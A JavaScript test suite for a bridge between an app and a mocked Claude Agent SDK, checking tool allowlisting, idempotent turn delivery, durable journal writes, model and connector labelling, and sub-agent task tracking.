import test from "node:test";
import { createServer } from "node:http";
import { once } from "node:events";
import assert from "node:assert/strict";
import { mkdtemp, mkdir, realpath, rm, readFile, symlink, writeFile } from "node:fs/promises";
import { join } from "node:path";
import { tmpdir } from "node:os";
import { Sessions } from "../sessions.mjs";
import { ClaudeBridge, folderConfiguration, folderTrusted, PROPOSED_DIFF_BYTES, proposedChange, unifiedDiff } from "../bridge.mjs";
import { PROJECT_TOOLS } from "../thread-tools.mjs";
import { ToolPolicy } from "../permissions.mjs";

// Contract owner: the bridge's subscription-to-durable-turn boundary. Replayed
// requests and restarts cannot spend a second model turn or report false success.
async function fixture(t, { authenticated = true, apiKey = false, messages = [] } = {}) {
  const root = await mkdtemp(join(tmpdir(), "wonder-bridge-"));
  t.after(() => rm(root, { recursive: true, force: true }));
  const sessions = await new Sessions(join(root, "sessions")).initialize();
  const frames = [], inputs = [], capturedOptions = [];
  const runtime = { sdk: {
    tool: (name, _description, _schema, handler) => ({ name, handler }),
    createSdkMcpServer: ({ tools }) => ({ tools }),
    query: ({ prompt, options }) => {
      capturedOptions.push(options);
      const query = (async function* () {
        for await (const input of prompt) {
          inputs.push(input);
          yield { type: "system", subtype: "init", session_id: options.sessionId ?? options.resume };
          for await (const message of typeof messages === "function" ? messages(input) : messages) {
            yield message.type === "result" && !message.user_message_uuid ? { ...message, user_message_uuid: input.uuid } : message;
          }
        }
      })();
      query.initializationResult = async () => ({});
      query.accountInfo = async () => ({ apiProvider: "firstParty", subscriptionType: authenticated ? "Claude Pro" : null, apiKeySource: apiKey ? "ANTHROPIC_API_KEY" : "none" });
      query.close = () => {};
      return query;
    },
  } };
  const activated = new Set();
  const updates = { acquire: async () => ({ runtime, release: async () => {} }), onActivated: listener => { activated.add(listener); return () => activated.delete(listener); } };
  const bridge = new ClaudeBridge({ updates, sessions, claudeSessionsDir: join(root, "native-sessions"), send: async frame => {
    if (frame.method === "turn/completed") {
      const durable = JSON.parse(await readFile(join(root, "sessions", `${frame.params.threadId}.json`)));
      assert.equal(durable.turns.find(t => t.id === frame.params.turnId).status, frame.params.turn.status);
    }
    frames.push(structuredClone(frame));
  } });
  t.after(() => bridge.close());
  const params = { cwd: root, wonderProject: { cwd: root, additionalDirectories: [] }, model: "claude:haiku", wonderPolicy: {
    mode: "read_only", approvalMode: "ask", readRoots: [root], writeRoots: [], deniedRoots: [] } };
  const { thread } = await bridge.request("thread/start", params);
  const finish = async () => { await new Promise(resolve => setImmediate(resolve)); await bridge.active.get(thread.id)?.finished; };
  const activate = version => Promise.all([...activated].map(listener => listener({ ...runtime, version })));
  return { root, sessions, bridge, thread, frames, inputs, capturedOptions, finish, activate };
}

test("approved Cupola tools tolerate SDK property reordering but reject changed arguments and replay", async t => {
  const done = Promise.withResolvers();
  const messages = (async function* () { await done.promise; yield { type: "result", subtype: "success" }; })();
  const f = await fixture(t, { messages });
  f.sessions.get(f.thread.id).options.dynamicTools = [{ name: "wonder_thread_read", description: "Read a thread",
    inputSchema: { type: "object", properties: { title: { type: "string" }, options: { type: "array", items: { type: "string" } } }, required: ["title", "options"] } }];
  await f.bridge.request("turn/start", { threadId: f.thread.id, input: [{ type: "text", text: "Ask one question" }] });
  while (!f.capturedOptions.length) await new Promise(resolve => setImmediate(resolve));
  const opts = f.capturedOptions[0], handler = opts.mcpServers.wonder.tools[0].handler;
  const input = { options: ["A", "B"], title: "Choose a fixture" };
  const context = { toolUseID: "owned-question", mcpServer: { name: "wonder", source: "sdk" } };
  assert.equal((await opts.canUseTool("mcp__wonder__wonder_thread_read", input, { ...context, mcpServer: { name: "wonder", source: "user" } })).behavior, "deny");
  assert.equal((await opts.canUseTool("mcp__wonder__wonder_thread_read", input, context)).behavior, "allow");
  await assert.rejects(handler({ title: input.title, options: ["B", "A"] }), /correlated/);
  const executed = handler({ title: input.title, options: input.options });
  await new Promise(resolve => setImmediate(resolve));
  const call = f.frames.find(frame => frame.method === "item/tool/call");
  assert.equal(call.params.callId, context.toolUseID);
  assert.deepEqual(call.params.arguments, { title: input.title, options: input.options });
  await f.bridge.receive({ id: call.id, result: { success: true, contentItems: [{ type: "inputText", text: '{"posted":true}' }] } });
  assert.equal((await executed).isError, false);
  await assert.rejects(handler(input), /correlated/);
  done.resolve(); await f.finish();
});

// Resuming a stored session must not resurrect the retired custom computer
// tool. Only the advertised Wonder tools may execute.

// Contract: the daemon's tool registry and this allowlist name the same tools
// (packages/protocol/thread-tools.json); a tool missing here would vanish from
// Claude without an error.
test("the Project tool allowlist is packages/protocol/thread-tools.json", async () => {
  const { names } = JSON.parse(await readFile(new URL("../../../packages/protocol/thread-tools.json", import.meta.url), "utf8"));
  assert.deepEqual([...PROJECT_TOOLS].sort(), [...names].sort());
  assert.ok(PROJECT_TOOLS.has("wonder_preferences"), "Cupola's own preferences tool, not T3 Code's");
});

test("unadvertised tools cannot execute", async t => {
  const f = await fixture(t, { messages: [{ type: "result", subtype: "success" }] });
  f.sessions.get(f.thread.id).options.dynamicTools = [{ name: "wonder_unknown" }];
  await f.bridge.request("turn/start", { threadId: f.thread.id, input: [{ type: "text", text: "Continue" }] });
  await f.finish();
  assert.equal(f.sessions.get(f.thread.id).turns[0].status, "completed");
  assert.deepEqual(f.capturedOptions[0].mcpServers, {});
  const result = await f.capturedOptions[0].canUseTool("mcp__wonder__wonder_unknown", { action: "key" },
    { toolUseID: "legacy", mcpServer: { name: "wonder", source: "sdk" } });
  assert.equal(result.behavior, "deny");
  assert.match(result.message, /unavailable/);
});

// Catalog labels must describe actual execution without changing saved model or
// MCP identities. Older SDKs and unfamiliar future IDs keep their runtime label.
test("model labels use resolved versions while preserving selections", async t => {
  const f = await fixture(t);
  const cases = [
    ["opus", "claude-opus-5-5", "Opus", "Opus 5.5"],
    ["sonnet", "claude-sonnet-5", "Sonnet", "Sonnet 5"],
    ["haiku", "claude-haiku-9", "Haiku", "Haiku 9"],
    ["claude-fable-5-1[1m]", "claude-fable-5-1", "Fable", "Fable 5.1"],
    ["claude-sonnet-5-20260901", undefined, "Sonnet", "Sonnet 5"],
    ["legacy-alias", undefined, "Legacy model", "Legacy model"],
    ["future-alias", "claude-next-special", "Next special", "Next special"],
  ];
  f.bridge.inspect = async () => ({ models: [
    { id: "default", name: "Default" },
    ...cases.map(([id, resolvedModel, name]) => ({ id, resolvedModel, name, efforts: ["low", "high"] })),
  ] });
  const { data } = await f.bridge.request("model/list", {});
  assert.deepEqual(data.map(m => m.id), cases.map(([id]) => `claude:${id}`));
  for (const [id, , , expected] of cases) {
    const model = data.find(m => m.id === `claude:${id}`);
    assert.equal(model.model, `claude:${id}`);
    assert.equal(model.displayName, expected);
    assert.deepEqual(model.supportedReasoningEfforts.map(e => e.reasoningEffort), ["low", "high"]);
  }
  assert.equal(f.inputs.length, 0);
});

// Contract: the picker follows Claude Code's catalog order and offers only the
// newest version of each family. The catalog is the one Claude Agent SDK
// 0.3.295 reported on 2026-10-09 (measured, no prompt sent).
test("model list is Opus, Fable, Sonnet, Haiku with no superseded Haiku 4.5", async t => {
  const f = await fixture(t);
  f.bridge.inspect = async () => ({ models: [
    { id: "default", resolvedModel: "claude-opus-5-5", name: "Default (recommended)", efforts: ["high"] },
    { id: "opus", resolvedModel: "claude-opus-5-5", name: "Opus", efforts: ["high"] },
    { id: "claude-fable-5-1[1m]", resolvedModel: "claude-fable-5-1", name: "Fable", efforts: ["high"] },
    { id: "sonnet", resolvedModel: "claude-sonnet-5-5", name: "Sonnet", efforts: ["high"] },
    { id: "haiku", resolvedModel: "claude-haiku-5-5", name: "Haiku", efforts: ["high"] },
    { id: "claude-haiku-4-5-20251001", resolvedModel: "claude-haiku-4-5-20251001", name: "Haiku 4.5", efforts: [] },
  ] });
  const { data } = await f.bridge.request("model/list", {});
  assert.deepEqual(data.map(m => m.displayName), ["Opus 5.5", "Fable 5.1", "Sonnet 5.5", "Haiku 5.5"]);
  assert.deepEqual(data.map(m => m.id), ["claude:opus", "claude:claude-fable-5-1[1m]", "claude:sonnet", "claude:haiku"]);
});

test("connector labels strip the Claude account prefix without changing MCP identity", async t => {
  const f = await fixture(t);
  const servers = [
    { name: "claude.ai Gmail", source: "claudeai", status: "connected" },
    { name: "Claude.ai: Google Calendar", source: "claudeai", status: "disabled" },
    { name: "claude.ai in a custom name", source: "user", status: "connected" },
    { name: "Custom claude.ai Gmail", source: "claudeai", status: "failed" },
    { name: "claude.ai Linear", source: "claudeai", status: "needs-auth" },
    { name: "wonder", source: "sdk", status: "connected" },
  ];
  f.bridge.inspect = async () => ({ servers });
  for (const method of ["app/installed", "app/read"]) {
    const { apps } = await f.bridge.request(method, {});
    assert.deepEqual(apps.map(a => a.name), ["Gmail", "Google Calendar", "claude.ai in a custom name", "Custom claude.ai Gmail", "Linear"]);
    assert.equal(apps[0].id, "claude:claude.ai Gmail");
    assert.equal(apps[0].runtimeName, "claude.ai Gmail");
    assert.equal(apps[0].callable, true);
    assert.equal(apps[1].enabled, false);
    assert.equal(apps[3].callable, false);
    // Only a signed-out claude.ai connector is "not connected", with claude.ai's link; a local server has none.
    assert.deepEqual(apps.map(a => a.isAccessible), [true, true, true, true, false]);
    const connectors = "https://claude.ai/settings/connectors";
    assert.deepEqual(apps.map(a => a.installUrl), [connectors, connectors, null, connectors, connectors]);
  }
  assert.deepEqual((await f.bridge.request("mcpServerStatus/list", {})).data, servers.slice(0, 5));
  assert.equal(f.inputs.length, 0);
});

test("duplicate delivery executes once and commits the terminal receipt before publishing", async t => {
  const f = await fixture(t, { messages: [
    { type: "assistant", message: { id: "reply", content: [{ type: "text", text: "Hello" }] } },
    { type: "result", subtype: "success" },
  ] });
  const params = { threadId: f.thread.id, clientUserMessageId: "same", input: [{ type: "text", text: "Hi" }] };
  const first = await f.bridge.request("turn/start", params);
  const duplicate = await f.bridge.request("turn/start", params);
  assert.equal(first.turn.id, duplicate.turn.id);
  await f.finish();
  assert.equal(f.inputs.length, 1);
  assert.equal(f.sessions.get(f.thread.id).turns[0].status, "completed");
  const persisted = JSON.parse(await readFile(join(f.root, "sessions", `${f.thread.id}.json`)));
  assert.equal(persisted.turns[0].status, "completed");
  assert.equal(f.frames.filter(e => e.method === "turn/completed").length, 1);
  const restarted = await new Sessions(join(f.root, "sessions")).initialize();
  assert.equal((await restarted.load(f.thread.id)).turns[0].status, "completed");
  // The "haiku" alias follows Claude Code to its current Haiku.
  assert.equal(f.capturedOptions[0].model, "haiku");
  assert.equal(f.capturedOptions[0].perTaskStopAffordance, true);
  const processBusy = f.bridge.processBusy;
  f.bridge.processBusy = () => true;
  await f.bridge.receive({ id: "replayed-receipt", method: "turn/start", params });
  assert.equal(f.frames.find(frame => frame.id === "replayed-receipt").result.turn.id, first.turn.id);
  f.bridge.processBusy = processBusy;
  // Storage errors must not impersonate a typed pre-admission refusal, even
  // after the failed attempt's speculative journal state is rolled back.
  f.sessions.save = async () => { throw Object.assign(new Error("This conversation already has an active turn."),
    { data: { turnStart: { accepted: false, action: "wait" } } }); };
  await f.bridge.receive({ id: "lost-receipt", method: "turn/start", params: { ...params, clientUserMessageId: "new" } });
  assert.equal(f.sessions.get(f.thread.id).turns.length, 1, "the failed attempt was rolled back");
  assert.equal(f.frames.find(frame => frame.id === "lost-receipt").error.data, undefined);
});

// Hold the real filesystem writer, rather than substituting an acceptance
// result. The bridge must not acknowledge either delivery until it is durable.
async function pendingWrite(sessions, session, start) {
  const gate = Promise.withResolvers();
  sessions.writes.set(session.id, gate.promise);
  const request = start();
  for (let n = 0; n < 100 && sessions.writes.get(session.id) === gate.promise; n++)
    await new Promise(resolve => setImmediate(resolve));
  if (sessions.writes.get(session.id) === gate.promise) {
    gate.resolve();
    await request;
    assert.fail("the turn did not reach the journal writer");
  }
  return { request, release: gate.resolve };
}

test("overlapping duplicate acknowledgements wait for the actual journal write", async t => {
  const f = await fixture(t, { messages: [{ type: "result", subtype: "success" }] });
  const session = f.sessions.get(f.thread.id);
  const params = { threadId: session.id, clientUserMessageId: "overlap", input: [{ type: "text", text: "Hi" }] };
  const held = await pendingWrite(f.sessions, session, () => f.bridge.receive({ id: "first", method: "turn/start", params }));
  const duplicate = f.bridge.receive({ id: "duplicate", method: "turn/start", params });
  try {
    await new Promise(resolve => setImmediate(resolve));
    assert.equal(f.frames.filter(frame => ["first", "duplicate"].includes(frame.id)).length, 0);
    assert.equal(f.inputs.length, 0);
    assert.deepEqual(JSON.parse(await readFile(join(f.root, "sessions", `${session.id}.json`))).turns, []);
  } finally {
    held.release();
    await Promise.all([held.request, duplicate]);
    await f.finish();
  }
  const replies = f.frames.filter(frame => ["first", "duplicate"].includes(frame.id));
  assert.equal(replies.length, 2);
  assert.equal(replies[0].result.turn.id, replies[1].result.turn.id);
  assert.equal(f.inputs.length, 1);
  const restarted = await new Sessions(join(f.root, "sessions")).initialize();
  assert.equal((await restarted.load(session.id)).receipts.overlap.id, replies[0].result.turn.id);
  assert.equal((await restarted.load(session.id)).turns[0].status, "completed");
});

test("a rejected journal write rejects overlapping deliveries and recovery dispatches exactly once", async t => {
  const f = await fixture(t, { messages: [{ type: "result", subtype: "success" }] });
  const session = f.sessions.get(f.thread.id);
  const { turn: earlier } = await f.sessions.accept(session, { clientUserMessageId: "earlier" });
  earlier.status = "completed";
  await f.sessions.save(session);
  const path = join(f.root, "sessions", `${session.id}.json`);
  const before = await readFile(path, "utf8");
  const blocker = `${path}.${process.pid}.tmp`;
  await mkdir(blocker); // open() must fail without replacing the valid journal.
  const params = { threadId: session.id, clientUserMessageId: "retryable", input: [{ type: "text", text: "Hi" }] };
  const held = await pendingWrite(f.sessions, session, () => f.bridge.receive({ id: "failed-first", method: "turn/start", params }));
  const duplicate = f.bridge.receive({ id: "failed-duplicate", method: "turn/start", params });
  held.release();
  await Promise.all([held.request, duplicate]);
  const replies = f.frames.filter(frame => ["failed-first", "failed-duplicate"].includes(frame.id));
  assert.equal(replies.length, 2);
  for (const reply of replies) {
    assert.match(reply.error?.message ?? "", /EISDIR/);
    assert.equal(reply.result, undefined);
    assert.equal(reply.error.data, undefined);
  }
  assert.equal(f.inputs.length, 0);
  assert.deepEqual(session.turns, [earlier]);
  assert.deepEqual(session.receipts, { earlier: { id: earlier.id, status: "completed" } });
  assert.equal(await readFile(path, "utf8"), before);
  assert.equal((await (await new Sessions(join(f.root, "sessions")).initialize()).load(session.id)).turns.length, 1);

  await rm(blocker, { recursive: true });
  const retried = await f.bridge.request("turn/start", params);
  const replay = await f.bridge.request("turn/start", params);
  await f.finish();
  assert.equal(retried.turn.id, replay.turn.id);
  assert.equal(f.inputs.length, 1);
  assert.deepEqual(session.turns.map(turn => turn.status), ["completed", "completed"]);
  const restarted = await new Sessions(join(f.root, "sessions")).initialize();
  assert.equal((await restarted.load(session.id)).receipts.retryable.id, retried.turn.id);
  assert.equal((await restarted.accept((await restarted.load(session.id)), params)).duplicate, true);
});

// Guide shares the journal admission boundary with turn/start, including replays
// while the original reply still owns the process. Hold that reply's real input
// stream so durability and dispatch can be checked independently.
async function guideFixture(t) {
  const ready = Promise.withResolvers(), answer = Promise.withResolvers();
  const f = await fixture(t, { messages: async function* (input) {
    if (input.priority !== "now") { ready.resolve(); await answer.promise; }
    yield { type: "result", subtype: "success" };
  } });
  const { turn } = await f.bridge.request("turn/start", { threadId: f.thread.id,
    clientUserMessageId: "running", input: [{ type: "text", text: "Long answer" }] });
  await ready.promise; // The initial input and init event have both been saved.
  const run = f.bridge.active.get(f.thread.id), session = f.sessions.get(f.thread.id);
  const params = { threadId: session.id, expectedTurnId: turn.id, clientUserMessageId: "guide",
    input: [{ type: "text", text: "Shorter please" }] };
  return { ...f, session, run, params, finishGuide: async () => {
    answer.resolve(); await run.finished; await f.finish();
  } };
}

test("overlapping Guide acknowledgements wait for the journal and dispatch once", async t => {
  const f = await guideFixture(t);
  const path = join(f.root, "sessions", `${f.session.id}.json`);
  const held = await pendingWrite(f.sessions, f.session, () => f.bridge.receive({ id: "guide-first", method: "turn/steer", params: f.params }));
  const duplicate = f.bridge.receive({ id: "guide-duplicate", method: "turn/steer", params: f.params });
  try {
    await new Promise(resolve => setImmediate(resolve));
    assert.equal(f.frames.filter(frame => ["guide-first", "guide-duplicate"].includes(frame.id)).length, 0);
    assert.equal(f.inputs.length, 1, "only the original reply was dispatched");
    assert.equal(JSON.parse(await readFile(path)).receipts.guide, undefined);
    assert.equal(f.run.steeredBy, undefined);
  } finally {
    held.release();
    await Promise.all([held.request, duplicate]);
    await f.finishGuide();
  }
  const replies = f.frames.filter(frame => ["guide-first", "guide-duplicate"].includes(frame.id));
  assert.equal(replies.length, 2);
  const id = replies[0].result.turnId;
  assert.equal(replies[1].result.turnId, id);
  assert.equal(f.inputs.filter(input => input.uuid === id).length, 1);
  assert.equal(f.inputs.find(input => input.uuid === id).priority, "now");
  assert.equal(f.capturedOptions.length, 1, "Guide uses the original process");
  const restarted = await new Sessions(join(f.root, "sessions")).initialize();
  assert.equal((await restarted.load(f.session.id)).receipts.guide.id, id);
  assert.equal((await restarted.load(f.session.id)).turns.find(turn => turn.id === id).status, "completed");
  f.bridge.sessions = restarted;
  assert.equal((await f.bridge.request("turn/steer", f.params)).turnId, id);
  assert.equal(f.inputs.length, 2, "replay after reload cannot dispatch another input");
});

test("a rejected Guide journal rejects duplicates and retries in the same running reply", async t => {
  const f = await guideFixture(t);
  const path = join(f.root, "sessions", `${f.session.id}.json`);
  const before = await readFile(path, "utf8"), running = f.session.turns[0];
  const blocker = `${path}.${process.pid}.tmp`;
  await mkdir(blocker);
  const held = await pendingWrite(f.sessions, f.session, () => f.bridge.receive({ id: "guide-failed", method: "turn/steer", params: f.params }));
  const duplicate = f.bridge.receive({ id: "guide-failed-duplicate", method: "turn/steer", params: f.params });
  try {
    held.release();
    await Promise.all([held.request, duplicate]);
    const replies = f.frames.filter(frame => ["guide-failed", "guide-failed-duplicate"].includes(frame.id));
    assert.equal(replies.length, 2);
    for (const reply of replies) {
      assert.match(reply.error?.message ?? "", /EISDIR/);
      assert.equal(reply.result, undefined);
      assert.equal(reply.error.data, undefined, "storage failure is not a pre-admission refusal");
    }
    assert.deepEqual(f.session.turns, [running]);
    assert.equal(f.session.turns[0], running, "the active run keeps its original turn reference");
    assert.deepEqual(f.session.receipts, { running: { id: running.id, status: "inProgress" } });
    assert.equal(f.run.admitting, null);
    assert.equal(f.run.steeredBy, undefined);
    assert.equal(f.bridge.active.get(f.session.id), f.run);
    assert.equal(f.inputs.length, 1);
    assert.equal(await readFile(path, "utf8"), before);
    await rm(blocker, { recursive: true });
    const failedReload = await new Sessions(join(f.root, "sessions")).initialize();
    assert.equal((await failedReload.load(f.session.id)).receipts.guide, undefined);

    const retried = await f.bridge.request("turn/steer", f.params);
    assert.equal((await f.bridge.request("turn/steer", f.params)).turnId, retried.turnId);
  } finally {
    held.release();
    await rm(blocker, { recursive: true, force: true });
    await Promise.all([held.request, duplicate]);
    await f.finishGuide();
  }
  const guide = f.session.turns.find(turn => turn.clientUserMessageId === "guide");
  assert.equal(guide.status, "completed");
  assert.equal(f.inputs.filter(input => input.uuid === guide.id).length, 1);
  assert.equal(f.capturedOptions.length, 1, "retry keeps the running process");
  const restarted = await new Sessions(join(f.root, "sessions")).initialize();
  f.bridge.sessions = restarted;
  assert.equal((await f.bridge.request("turn/steer", f.params)).turnId, guide.id);
  assert.deepEqual((await restarted.load(f.session.id)).turns.map(turn => turn.status), ["completed", "completed"]);
  assert.equal(f.inputs.length, 2);
});

test("Guide replay uses its durable receipt after retention and restart", async t => {
  const f = await fixture(t), session = f.sessions.get(f.thread.id);
  const params = { threadId: session.id, expectedTurnId: "finished", clientUserMessageId: "retired-guide", input: [] };
  const { turn: guide } = await f.sessions.accept(session, params, { steering: true, checkpointed: true });
  guide.status = "completed";
  // Seed later completed history; the next real admission exercises retention.
  session.turns.push(...Array.from({ length: 199 }, (_, n) => ({ id: `later-${n}`, status: "completed", items: [] })));
  const { turn: latest } = await f.sessions.accept(session, { clientUserMessageId: "latest" });
  latest.status = "completed";
  await f.sessions.save(session);
  assert.equal(session.turns.length, 200);
  assert.equal(session.turns.includes(guide), false);
  const restarted = await new Sessions(join(f.root, "sessions")).initialize();
  f.bridge.sessions = restarted;
  const path = join(f.root, "sessions", `${session.id}.json`), before = await readFile(path, "utf8");
  assert.deepEqual((await restarted.load(session.id)).receipts[params.clientUserMessageId], { id: guide.id, status: "completed" });
  assert.equal((await f.bridge.request("turn/steer", params)).turnId, guide.id);
  assert.equal(await readFile(path, "utf8"), before, "receipt replay does not rewrite history");
  assert.equal(f.inputs.length, 0);
});

// Contract: only actual agent tasks reach the existing agent roster/activity
// renderer. SDK background launches are acknowledgements, not completed work;
// task IDs still identify completion when the optional tool ID is absent.
test("agent lifecycle links the parent activity to a readable child without launch metadata", async t => {
  let f;
  const messages = (async function* () {
    yield { type: "assistant", message: { content: [{ type: "tool_use", id: "agent-call", name: "Agent",
      input: { description: "Review guide", subagent_type: "general-purpose", run_in_background: true, prompt: "Private task instructions" } }] } };
    yield { type: "system", subtype: "task_started", task_type: "local_agent", task_id: "agent-task",
      tool_use_id: "agent-call", description: "Review guide", spawn_depth: 1, is_backgrounded: true };
    yield { type: "user", tool_use_result: { status: "async_launched", isAsync: true, agentId: "agent-task" },
      message: { content: [{ type: "tool_result", tool_use_id: "agent-call", content: "Internal launch metadata and output file path" }] } };
    yield { type: "assistant", parent_tool_use_id: "agent-call", message: { id: "child-reply", content: [{ type: "text", text: "Checked the guide." }] } };
    const child = [...f.sessions.values.values()].find(s => s.parent);
    const live = await f.bridge.request("thread/read", { threadId: child.id, includeTurns: true });
    assert.equal(live.thread.status.type, "active");
    assert.equal(live.thread.turns[0].items[0].text, "Checked the guide.");
    yield { type: "system", subtype: "task_notification", task_id: "agent-task", status: "completed", summary: "Checked the guide." };
    yield { type: "system", subtype: "task_notification", task_id: "agent-task", tool_use_id: "agent-call", status: "completed", summary: "Checked the guide." };
    yield { type: "result", subtype: "success" };
  })();
  f = await fixture(t, { messages });
  await f.bridge.request("turn/start", { threadId: f.thread.id, input: [{ type: "text", text: "Review" }] });
  await f.finish();
  const children = [...f.sessions.values.values()].filter(s => s.parent);
  assert.equal(children.length, 1);
  const child = children[0];
  assert.equal(child.turns[0].status, "completed");
  assert.equal(child.turns[0].items.filter(i => i.type === "agentMessage").length, 1);
  const activity = f.sessions.get(f.thread.id).turns[0].items.filter(i => i.type !== "userMessage");
  assert.equal(activity.length, 1);
  assert.equal(activity[0].type, "subAgentActivity");
  assert.equal(activity[0].agentThreadId, child.id);
  assert.equal(activity[0].agentNickname, "Review guide");
  assert.equal(activity[0].status, "completed");
  assert.doesNotMatch(JSON.stringify(f.frames), /Internal launch metadata|Private task instructions/);
  assert.equal(f.frames.filter(e => e.method === "turn/completed" && e.params.threadId === child.id).length, 1);
  const restarted = await new Sessions(join(f.root, "sessions")).initialize();
  assert.equal((await restarted.load(child.id)).turns[0].items[0].text, "Checked the guide.");
  await assert.rejects(f.bridge.request("turn/start", { threadId: child.id, input: [{ type: "text", text: "Change" }] }), /parent conversation/);
});

test("a chat's agent listing has only its own agents, never archived ones, without reading other chats", async t => {
  const f = await fixture(t), parent = f.sessions.get(f.thread.id);
  // Another chat whose long instructions put `parent` past the first head read,
  // with text that looks like a parent key inside them.
  const other = await f.sessions.create({ ...parent.options, instructions: `${"x".repeat(40_000)}","parent":{"threadId":"${parent.id}"}`,
    meta: { parent: { threadId: parent.id } } });
  const agent = (owner, n) => f.sessions.create(owner.options, { threadId: owner.id, nativeSessionId: owner.sdkSessionId, depth: 1, name: `Agent ${n}`, role: "Helper" });
  for (let n = 0; n < 110; n++) await agent(other, n);
  const own = [await agent(parent, 1), await agent(parent, 2)].map(child => child.id);
  // A restarted runtime has indexed nothing yet.
  const restarted = await new Sessions(join(f.root, "sessions")).initialize();
  restarted.pinned = f.sessions.pinned; f.bridge.sessions = restarted;
  const loaded = [], read = restarted.readSession.bind(restarted);
  restarted.readSession = id => { loaded.push(id); return read(id); };
  const params = { sourceKinds: ["subAgentThreadSpawn"], parentThreadId: parent.id, limit: 100 };
  const current = await f.bridge.request("thread/list", { ...params, archived: false });
  assert.deepEqual(current.data.map(thread => thread.id).sort(), own.sort());
  assert.equal(current.nextCursor, null);
  assert.ok(current.data.every(thread => thread.parentThreadId === parent.id));
  assert.deepEqual(new Set(loaded), new Set([...own, parent.id]), "other chats' journals stay unread");
  assert.deepEqual(await f.bridge.request("thread/list", { ...params, archived: true }), { data: [], nextCursor: null });
  assert.equal((await f.bridge.request("thread/list", { ...params, parentThreadId: other.id })).data.length, 100);
  await assert.rejects(f.bridge.request("thread/list", { ...params, parentThreadId: 7 }), /list its agents/);
});

test("shell, ambient and unknown task events never create phantom agents", async t => {
  const messages = [];
  for (const [id, fields] of [["shell", { task_type: "local_bash" }], ["quiet", { task_type: "local_agent", ambient: true }],
    ["hidden", { task_type: "local_agent", skip_transcript: true }], ["future", { task_type: "future_task" }]]) {
    messages.push({ type: "system", subtype: "task_started", task_id: id, tool_use_id: id, ...fields },
      { type: "system", subtype: "task_progress", task_id: id, tool_use_id: id, description: "Working" },
      { type: "assistant", parent_tool_use_id: id, message: { id, content: [{ type: "text", text: "Hidden helper text" }] } },
      { type: "system", subtype: "task_notification", task_id: id, tool_use_id: id, status: "completed", summary: "Done" });
  }
  messages.push({ type: "system", subtype: "task_notification", task_id: "orphan", tool_use_id: "orphan", status: "completed", summary: "Done" },
    { type: "result", subtype: "success" });
  const f = await fixture(t, { messages });
  await f.bridge.request("turn/start", { threadId: f.thread.id, input: [{ type: "text", text: "Check" }] });
  await f.finish();
  assert.equal(f.sessions.values.size, 1);
  assert.doesNotMatch(JSON.stringify(f.frames), /Hidden helper text/);
});

test("foreground helpers retain their final report and failed or stopped tasks stay honest", async t => {
  for (const [status, expected] of [["completed", "completed"], ["failed", "failed"], ["stopped", "interrupted"]]) {
    const f = await fixture(t, { messages: [
      { type: "system", subtype: "task_started", task_type: "local_agent", task_id: "task", tool_use_id: "call", description: "Check", is_backgrounded: false },
      // Foreground SDK captures may omit the child assistant message entirely.
      { type: "system", subtype: "task_notification", task_id: "task", status, summary: "Final task report" },
      { type: "result", subtype: "success" },
    ] });
    await f.bridge.request("turn/start", { threadId: f.thread.id, input: [{ type: "text", text: "Check" }] });
    await f.finish();
    const child = [...f.sessions.values.values()].find(s => s.parent);
    assert.equal(child.turns[0].status, expected);
    assert.equal(child.turns[0].items[0].text, "Final task report");
    const activity = f.sessions.get(f.thread.id).turns[0].items.find(i => i.type === "subAgentActivity");
    assert.equal(activity.status, expected);
  }
});

test("structured agent results complete a task without exposing the model-directed trailer", async t => {
  let f, before, after;
  const call = { type: "assistant", message: { content: [{ type: "tool_use", id: "call", name: "Agent", input: { description: "Review" } }] } };
  const list = async () => (await f.bridge.request("thread/backgroundTasks/list", { threadId: f.thread.id })).data[0];
  const messages = (async function* () {
    call.timestamp = new Date().toISOString();
    yield call;
    yield { type: "system", subtype: "task_started", task_type: "local_agent", task_id: "task", tool_use_id: "call", description: "Review" };
    yield { type: "system", subtype: "task_progress", task_id: "task", summary: "Reviewing the guide" };
    before = await list();
    yield { type: "user", tool_use_result: { status: "completed", agentId: "task", content: [{ type: "text", text: "Clean report" }] },
      message: { content: [{ type: "tool_result", tool_use_id: "call", content: "Clean report\nInternal agentId and usage trailer" }] } };
    after = await list();
    yield { type: "result", subtype: "success" };
  })();
  f = await fixture(t, { messages });
  f.bridge.projectMessages = f.bridge.projectTaskMessages = async () => ({ stamp: null, messages: [call], desktop: false });
  await f.bridge.request("turn/start", { threadId: f.thread.id, input: [{ type: "text", text: "Check" }] });
  await f.finish();
  assert.equal(before.progressSummary, "Reviewing the guide");
  assert.deepEqual([after.status, after.progressSummary], ["completed", null]);
  const child = [...f.sessions.values.values()].find(s => s.parent);
  assert.equal(child.turns[0].status, "completed");
  assert.equal(child.turns[0].items[0].text, "Clean report");
  assert.doesNotMatch(JSON.stringify(f.frames), /usage trailer/);
});

test("nested agents belong to their actual parent and unfinished work is never shown as completed", async t => {
  for (const finished of [true, false]) {
    const f = await fixture(t, { messages: [
      { type: "system", subtype: "task_started", task_type: "local_agent", task_id: "outer", tool_use_id: "outer-call", description: "Research", spawn_depth: 1 },
      { type: "assistant", parent_tool_use_id: "outer-call", message: { content: [{ type: "tool_use", id: "inner-call", name: "Agent", input: { description: "Check source" } }] } },
      { type: "system", subtype: "task_started", task_type: "local_agent", task_id: "inner", tool_use_id: "inner-call", description: "Check source", spawn_depth: 2 },
      ...(finished ? [{ type: "system", subtype: "task_notification", task_id: "inner", status: "completed", summary: "Source checked" }] : []),
      { type: "result", subtype: "success" },
    ] });
    await f.bridge.request("turn/start", { threadId: f.thread.id, input: [{ type: "text", text: "Check" }] });
    await f.finish();
    await f.bridge.close();
    const children = [...f.sessions.values.values()].filter(s => s.parent);
    const outer = children.find(s => s.parent.depth === 1), inner = children.find(s => s.parent.depth === 2);
    assert.equal(inner.parent.threadId, outer.id);
    assert.equal(outer.parent.threadId, f.thread.id);
    assert.equal(inner.turns[0].status, finished ? "completed" : "interrupted");
    assert.equal(outer.turns[0].status, "interrupted");
    assert.equal(outer.turns[0].items[0].agentThreadId, inner.id);
    assert.equal(outer.turns[0].items[0].status, finished ? "completed" : "interrupted");
    const restarted = await new Sessions(join(f.root, "sessions")).initialize();
    assert.equal((await restarted.load(outer.id)).turns[0].items[0].status, finished ? "completed" : "interrupted");
    assert.equal(f.frames.at(-1).method, "turn/completed");
    const completed = f.frames.findLast(e => e.method === "turn/completed" && e.params.threadId === f.thread.id);
    assert.equal(completed.params.turn.items.find(i => i.type === "subAgentActivity").status, "running");
  }
});
